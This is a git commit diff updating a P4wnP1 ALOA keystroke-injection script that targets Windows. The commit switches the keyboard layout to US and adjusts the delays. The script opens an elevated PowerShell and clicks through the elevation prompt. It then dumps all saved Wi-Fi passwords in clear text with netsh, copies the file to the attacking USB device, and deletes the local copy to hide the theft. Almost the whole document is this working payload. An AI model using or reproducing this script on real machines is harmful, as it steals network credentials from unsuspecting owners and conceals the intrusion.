28dbf9b63b2357d7c4b2d39732ba7636b99ff751
MitchOgden <mitchelltogden@gmail.com>
2020-07-18 07:04:47 -0400

    Update win-dump-wifi-de.js
    adjust layout and delays

--- win-dump-wifi-de.js
+++ win-dump-wifi-de.js
@@ -1,15 +1,20 @@
 
-layout('de')
+layout("US"); //set US layout
+
+//Natural typing speed (100 ms between keys + additional jitter up to 200 ms)
+typingSpeed(25,0);
 press("GUI r")
-delay(400)
+delay(1000)
 type("powershell.exe")
+delay(1500)
 press("CTRL SHIFT ENTER")
-delay(1200)
+delay(1000)
 press("LEFT")
+delay(500)
 press("ENTER")
-delay(750)
+delay(400)
 type("netsh wlan show profiles * key=clear > wirelesspassword.txt\n")
-delay(750)
+delay(1000)
 type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'P4wnP1 ALOA' } | select name \n")
 type("copy wirelesspassword.txt $usbpath.name\n")
 type("del wirelesspassword.txt ; exit\n")
